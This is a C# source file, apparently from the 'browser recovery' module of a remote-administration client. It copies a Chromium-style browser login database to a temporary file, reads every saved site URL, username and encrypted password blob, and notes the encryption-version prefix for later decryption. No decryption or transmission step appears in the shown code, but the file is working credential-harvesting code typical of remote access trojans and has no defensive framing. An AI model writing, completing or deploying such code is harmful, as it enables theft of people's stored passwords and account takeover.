using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    /// <summary>
    /// Helper class for reading SQLite databases with proper binary handling
    /// </summary>
    public class SQLiteHandler : IDisposable
    {
        private SQLiteConnection _connection;
        private readonly string _tempDbPath;

        public SQLiteHandler(string dbPath)
        {
            // Create a temporary copy of the database to avoid lock issues
            _tempDbPath = Path.Combine(Path.GetTempPath(), $"temp_db_{Guid.NewGuid()}.db");

            try
            {
                File.Copy(dbPath, _tempDbPath, true);
                _connection = new SQLiteConnection($"Data Source={_tempDbPath};Version=3;");
                _connection.Open();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to open database: {ex.Message}", ex);
            }
        }

        public List<LoginData> ReadLogins()
        {
            var logins = new List<LoginData>();

            using (var command = new SQLiteCommand(
                "SELECT origin_url, action_url, username_value, password_value FROM logins",
                _connection))
            using (var reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    var originUrl = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                    var actionUrl = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
                    var username = reader.IsDBNull(2) ? string.Empty : reader.GetString(2);

                    byte[] encryptedPassword = null;
                    if (!reader.IsDBNull(3))
                    {
                        long length = reader.GetBytes(3, 0, null, 0, 0);
                        encryptedPassword = new byte[length];
                        reader.GetBytes(3, 0, encryptedPassword, 0, (int)length);
                    }

                    var url = !string.IsNullOrEmpty(originUrl) ? originUrl : actionUrl;

                    if (!string.IsNullOrEmpty(url))
                    {
                        var login = new LoginData
                        {
                            Url = url,
                            Username = username,
                            EncryptedPassword = encryptedPassword
                        };

                        // Diagnostics: prefix + length (do NOT print actual decrypted data)
                        if (encryptedPassword != null && encryptedPassword.Length > 0)
                        {
                            login.BlobLength = encryptedPassword.Length;

                            // try ASCII prefix first (3 bytes)
                            if (encryptedPassword.Length >= 3)
                            {
                                try
                                {
                                    var prefix = System.Text.Encoding.ASCII.GetString(encryptedPassword, 0, 3);
                                    // if printable ascii, store it, otherwise hex
                                    bool allPrintable = true;
                                    foreach (var c in prefix)
                                        if (char.IsControl(c) || c == '\ufffd') { allPrintable = false; break; }

                                    login.BlobPrefixAscii = allPrintable ? prefix : BitConverter.ToString(encryptedPassword, 0, Math.Min(3, encryptedPassword.Length)).Replace("-", "");
                                }
                                catch
                                {
                                    login.BlobPrefixAscii = BitConverter.ToString(encryptedPassword, 0, Math.Min(3, encryptedPassword.Length)).Replace("-", "");
                                }
                            }
                            else
                            {
                                login.BlobPrefixAscii = BitConverter.ToString(encryptedPassword).Replace("-", "");
                            }
                        }
                        else
                        {
                            login.BlobLength = 0;
                            login.BlobPrefixAscii = "<empty>";
                        }

                        logins.Add(login);
                    }
                }
            }

            return logins;
        }

        public void Dispose()
        {
            try
            {
                _connection?.Close();
                _connection?.Dispose();

                if (File.Exists(_tempDbPath))
                {
                    File.Delete(_tempDbPath);
                }
            }
            catch
            {
                // Ignore cleanup errors
            }
        }
    }

    public class LoginData
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public byte[] EncryptedPassword { get; set; }
        public string BlobPrefixAscii { get; set; }    // e.g. "v10" or hex if non-ascii
        public int BlobLength { get; set; }
    }
}
